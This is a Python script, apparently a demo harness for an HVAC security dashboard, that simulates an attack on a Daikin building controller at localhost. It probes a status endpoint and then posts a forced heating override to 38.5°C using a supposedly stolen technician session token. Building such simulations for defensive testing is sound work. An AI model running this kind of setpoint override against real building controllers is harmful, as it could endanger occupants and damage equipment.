#!/usr/bin/env python3
"""
=============================================================================
PARIS-AC: Simulated Attacker Exploit Script
=============================================================================
Simulates the real-world cyberattack against European retail store HVACs:
1. Recons the target Daikin Controller.
2. Identifies exposed BACnet/REST management endpoints.
3. Injects a malicious setpoint override payload (spiking temperature to 38.5°C).
4. Evaluates the server's response.
=============================================================================
"""

import time
import json
import sys

try:
    import requests
except ImportError:
    print("[!] Error: 'requests' module required. Run: pip install requests")
    sys.exit(1)

TARGET_URL = "http://127.0.0.1:8080"

# Use clean session bypassing any proxy configuration
session = requests.Session()
session.trust_env = False

def print_banner():
    banner = r"""
   ___              _            ___   ____ 
  / _ \___ ________(_)__  ___   / _ | / __/ 
 / ___/ _ `/ __/ // (_-< / _ \ / __ |/ /__  
/_/   \_,_/_/ /_//_/___/ \___//_/ |_|\___/  
 [!] Retail Store HVAC Exploitation Tool
 [!] Simulating Paris Store Heatwave Tampering
"""
    print(banner)

def run_attack():
    print_banner()
    print(f"[*] Step 1: Probing target Daikin Gateway at {TARGET_URL}...")
    time.sleep(1)

    try:
        res = session.get(f"{TARGET_URL}/api/v1/hvac/status", timeout=5)
        if res.status_code == 200:
            data = res.json()
            print("[+] SUCCESS: Found exposed IoT Controller!")
            print(f"    Vendor:   {data.get('vendor')}")
            print(f"    Model:    {data.get('model')}")
            print(f"    Firmware: {data.get('firmware_version')}")
            current_temp = data.get('telemetry', {}).get('current_temp')
            print(f"    Current Indoor Temp: {current_temp}°C")
        else:
            print(f"[-] Target responded with HTTP {res.status_code}")
            return
    except Exception as e:
        print(f"[-] Could not connect to {TARGET_URL}. Is server.py running? ({e})")
        return

    print("\n[*] Step 2: Preparing malicious thermal setpoint override payload...")
    time.sleep(1.2)

    # The Paris attack payload: forcing extreme heating during retail hours
    malicious_payload = {
        "unit_id": "DAIKIN-VRV-PARIS-04",
        "action": "FORCE_OVERRIDE",
        "setpoint_temp": 38.5,
        "mode": "EMERGENCY_HEAT",
        "fan_override": "MAX_BLOWER",
        "comment": "Paris Retail Campaign - Thermal Overload"
    }

    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer EXPLOITED_TECHNICIAN_SESSION_KEY_0x89A"
    }

    print("    Injecting command: Setpoint -> 38.5°C (Overheat Zone 1)")
    print(f"    Sending payload to: {TARGET_URL}/api/v1/hvac/setpoint")
    time.sleep(1)

    try:
        attack_res = session.post(
            f"{TARGET_URL}/api/v1/hvac/setpoint",
            json=malicious_payload,
            headers=headers,
            timeout=5
        )

        print("\n[*] Step 3: Server Response Received:")
        time.sleep(0.8)

        if attack_res.status_code == 200:
            resp_data = attack_res.json()
            print("[+] COMMAND ACCEPTED BY TARGET CONTROLLER!")
            print(json.dumps(resp_data, indent=4))
            print("\n[!] Result: Attacker believes the store temperature is climbing to 38.5°C!")
            print("[i] Check the PARIS-AC Security Dashboard at http://localhost:8080 to see the AI defense triage in real time!\n")
        else:
            print(f"[-] Command rejected: {attack_res.status_code} {attack_res.text}")

    except Exception as e:
        print(f"[-] Exploit delivery failed: {e}")

if __name__ == "__main__":
    run_attack()
